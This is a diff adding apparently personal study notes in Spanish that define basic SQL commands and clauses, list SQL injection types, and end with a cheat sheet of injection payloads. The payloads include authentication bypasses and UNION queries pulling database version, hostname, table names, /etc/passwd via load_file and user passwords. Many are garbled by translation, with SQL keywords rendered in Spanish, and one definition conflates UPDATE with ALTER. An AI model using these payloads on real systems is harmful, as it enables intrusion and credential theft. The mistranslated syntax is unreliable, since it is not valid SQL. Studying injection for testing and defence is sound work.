@@ -1,0 +1,49 @@
+COMANDOS SQL
+SELECT Utilizado para consultar registros de la base de datos que satisfagan un criterio determinado
+INSERT Utilizado para cargar lotes de datos en la base de datos en una única operación.
+UPDATE Utilizado para modificar los valores de los campos y registros especificados Utilizado para modificar las tablas agregando campos o cambiando la definición de los campos.
+DELETE Utilizado para eliminar registros de una tabla
+
+CLAUSULAS
+FROM Utilizada para especificar la tabla de la cual se van a seleccionar los registros
+GROUP BY Utilizada para separar los registros seleccionados en grupos específicos
+HAVING Utilizada para expresar condición que debe satisfacer cada grupo
+ORDER BY Utilizada para ordenar los registros seleccionados de acuerdo con un orden específico
+WHERE Utilizada para determinar los registros seleccionados en la clausula FROM
+
+TIPOS DE INYECCIÓN SQL
+Inyeccion SQL In-Band(SQL inyection Clasico)
+    Basada es error (verificacion si es vulnerable)
+ Basada en Uniones
+InyeccionSQL Inferencial (Inyección SQL ciega)
+    Basada en Booleanos (Boolean-based)
+ Basada en tiempo -- Investigar más
+Inyeccion SQL Fuera de Banda
+    Envio de peticiones al servidor controlado por el atacante
+
+CARGAS ÚTILES:
+'or1=1 --
+'o ''='
+'o 1=1 --
+' o ''
+-- o #
+' o '1
+' o 1 -- -
+" o " "="
+"o 1=1 -- -
+' o ''=''
+'=0 -- +
+o 1=1
+'o'1'='1
+
+SELECCIONE first_name, last_name DE usuarios DONDE user_id = ' o 1 =1 unión seleccione 1,2 #
+' o 1=1 unión seleccione usuario(),1 #
+' o 1=1 unión seleccione versión(),1 #
+' unión seleccione 1.@@version #
+' unión seleccione null,@@hostname #
+' unión todos seleccione system_user(),usuario() #
+' unión, seleccione null,base de datos() #
+' unión seleccione null,table_name de information_schema.tables #
+' unión seleccione null,@@datadir #
+' unión todos seleccionen load_file('/etc/passwd'),null #
+'o 1=1 unión seleccione usuario, contraseña de usuarios #
